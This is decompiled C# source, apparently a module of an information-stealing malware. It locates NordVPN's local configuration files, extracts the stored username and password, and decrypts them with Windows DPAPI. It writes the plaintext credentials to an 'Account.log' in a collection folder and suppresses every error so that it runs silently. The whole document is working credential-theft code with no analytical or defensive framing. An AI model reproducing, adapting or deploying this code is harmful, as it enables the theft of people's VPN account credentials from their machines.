using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Moist;

// Token: 0x02000056 RID: 86
internal class Class23
{
	// Token: 0x0600023B RID: 571 RVA: 0x000124B8 File Offset: 0x000106B8
	public static void smethod_0(string string_1)
	{
		try
		{
			if (Directory.Exists(Help.LocalData + "\\NordVPN\\"))
			{
				Directory.CreateDirectory(string_1 + Class23.string_0);
				using (StreamWriter streamWriter = new StreamWriter(string_1 + Class23.string_0 + "\\Account.log"))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Help.LocalData, "NordVPN"));
					if (directoryInfo.Exists)
					{
						DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
						for (int i = 0; i < directories.Length; i++)
						{
							foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
							{
								streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
								string text = Path.Combine(directoryInfo2.FullName, "user.config");
								if (File.Exists(text))
								{
									XmlDocument xmlDocument = new XmlDocument();
									xmlDocument.Load(text);
									string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
									string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
									if (innerText != null && !string.IsNullOrEmpty(innerText))
									{
										streamWriter.WriteLine("\t\tUsername: " + Class23.smethod_1(innerText));
									}
									if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
									{
										streamWriter.WriteLine("\t\tPassword: " + Class23.smethod_1(innerText2));
									}
									Class23.int_0++;
								}
							}
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600023C RID: 572 RVA: 0x00012688 File Offset: 0x00010888
	public static string smethod_1(string string_1)
	{
		string result;
		try
		{
			result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(string_1), null, DataProtectionScope.LocalMachine));
		}
		catch
		{
			result = "";
		}
		return result;
	}

	// Token: 0x0600023D RID: 573 RVA: 0x0000446C File Offset: 0x0000266C
	public Class23()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x0600023E RID: 574 RVA: 0x00005243 File Offset: 0x00003443
	// Note: this type is marked as 'beforefieldinit'.
	static Class23()
	{
		Class40.gcO0h7LzslQIW();
		Class23.int_0 = 0;
		Class23.string_0 = "\\Vpn\\NordVPN";
	}

	// Token: 0x04000101 RID: 257
	public static int int_0;

	// Token: 0x04000102 RID: 258
	public static string string_0;
}
